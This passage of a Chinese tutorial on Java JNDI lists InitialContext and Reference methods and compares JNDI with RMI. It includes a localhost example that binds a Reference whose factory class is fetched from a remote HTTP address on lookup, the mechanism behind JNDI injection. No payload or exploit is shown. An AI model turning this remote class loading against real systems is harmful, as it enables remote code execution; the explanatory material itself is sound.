&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Name&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索命名对象。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//将名称绑定到对象，覆盖任何现有绑定。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//取消绑定命名对象。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">unbind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>示例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.InitialContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.NamingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">jndi&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:1099/work&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span> &lt;span style="color:#111">initialContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">initialContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="reference">Reference&lt;/h4>
&lt;p>该类也是在&lt;code>javax.naming&lt;/code>的一个类，该类表示对在命名/目录系统外部找到的对象的引用，提供了&lt;code>JNDI&lt;/code>中类的引用功能&lt;/p>
&lt;p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naiming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI LDAP等&lt;/p>
&lt;p>构造&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//为类名为“className”的对象构造一个新的引用。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//为类名为“className”的对象和地址构造一个新引用。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">RefAddr&lt;/span> &lt;span style="color:#111">addr&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">RefAddr&lt;/span> &lt;span style="color:#111">addr&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">factoryLocation&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">factoryLocation&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">参数：
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">className 远程加载时所使用的类名，如果本地没有从远程加载
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">factory 加载的class中需要实例化类的名称，远程的工厂类
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">factoryLocation 提供classes数据的工厂类加载的地址，可以是file/ftp/http协议
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>常用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//将地址添加到索引posn的地址列表中。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">posn&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">RefAddr&lt;/span> &lt;span style="color:#111">addr&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//将地址添加到地址列表的末尾。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RefAddr&lt;/span> &lt;span style="color:#111">addr&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//从此引用中删除所有地址。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">clear&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索索引posn上的地址。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">RefAddr&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">posn&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索地址类型为“addrType”的第一个地址。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">RefAddr&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">addrType&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索本参考文献中地址的列举。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Enumeration&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">RefAddr&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">getAll&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索引用引用的对象的类名。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getClassName&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索此引用引用的对象的工厂位置。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getFactoryClassLocation&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索此引用引用对象的工厂的类名。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getFactoryClassName&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//从地址列表中删除索引posn上的地址。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">posn&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//检索此引用中的地址数。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">size&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//生成此引用的字符串表示形式。
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>示例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.jndi.rmi.registry.ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.NamingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.Reference&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.AlreadyBoundException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.Registry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">jndi&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">AlreadyBoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">reference&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;testrefClassName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;testFactoryClassName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ReferenceWrapper&lt;/span> &lt;span style="color:#111">referenceWrapper&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">reference&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;testrefObj&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">referenceWrapper&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 也可以用JNDI的 ctx.bind(&amp;#34;aa&amp;#34;, referenceWrapper);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到在创建Reference对象后又用ReferenceWrapper进行封装，原因是Reference没有Remote接口也没有继承UnicastRemoteObject类，而这两个条件是注册到RMI Registry的必要条件，所以需要封装&lt;/p>
&lt;p>当有客户端通过 &lt;code>lookup(&amp;quot;refObj&amp;quot;)&lt;/code> 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference类的实例，客户端会首先去本地的 &lt;code>CLASSPATH&lt;/code> 去寻找被标识为 &lt;code>testrefClassName&lt;/code> 的类，如果本地未找到，则会去请求 &lt;code>http://127.0.0.1:8080/testFactoryClassName.class&lt;/code> 加载工厂类&lt;/p>
&lt;h4 id="与rmi的对比">与RMI的对比&lt;/h4>
&lt;p>最简单的区别：&lt;/p>
&lt;ul>
&lt;li>RMI的引入包&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.Registry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">remote.IRemoteMath&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>JNDI的引入包&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.Context&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.InitialContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中&lt;/p>
&lt;p>客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的&lt;/p>
&lt;ul>
&lt;li>RMI的写法&lt;/li>
&lt;/ul>
&lt;p>写法1&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 服务端
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">IRemoteMath&lt;/span> &lt;span style="color:#111">remoteMath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RemoteMath&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRegistry&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Compute&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">remoteMath&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 客户端
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">IRemoteMath&lt;/span> &lt;span style="color:#111">remoteMath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IRemoteMath&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Compute&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>写法2&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 服务端
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">PersonService&lt;/span> &lt;span style="color:#111">personService&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PersonServiceImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">6600&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:6600/PersonService&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">personService&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
